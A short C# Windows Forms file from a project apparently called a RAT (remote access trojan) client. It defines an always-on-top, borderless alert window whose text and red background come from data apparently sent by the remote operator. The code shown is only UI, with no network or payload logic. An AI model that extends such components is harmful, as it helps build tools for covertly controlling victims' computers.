using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SpartaRATclient
{
    public partial class Alert : Form
    {
        public Alert(byte[] data)
        {
            InitializeComponent();

            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None;

            string[] info = Encoding.ASCII.GetString(data).Split('\0');
            this.field1.Text = info[0];
            this.field2.Text = info[1];
            if (info[2] == "Red")
                this.BackColor = Color.FromArgb(192, 0, 0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Death_Load(object sender, EventArgs e)
        {

        }
    }
}
